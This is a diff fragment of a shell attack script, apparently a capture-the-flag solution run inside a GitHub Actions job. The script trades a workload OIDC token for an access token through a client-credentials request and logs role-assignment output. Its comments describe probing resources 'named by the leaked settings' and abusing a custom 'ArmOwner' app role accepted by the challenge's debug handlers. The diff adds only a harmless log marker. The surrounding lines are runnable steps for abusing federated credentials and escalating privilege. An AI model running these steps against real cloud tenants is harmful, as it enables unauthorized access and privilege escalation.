@@ -64,6 +64,7 @@ echo SA_ROLE_ASSIGN=$(echo "$rr3" | tail -c 900)
 customresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 custom=$(echo "$customresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo CUSTOM_LEN=${#custom}
+echo RETRY_MARK=platform_fic_second_exchange
 # Probe the two resources named by the leaked settings.  The custom ArmOwner
 # app-role is not understood by ARM itself, but is accepted by the challenge's
 # internal catalog/debug handlers; keep all response bodies in the Action log.
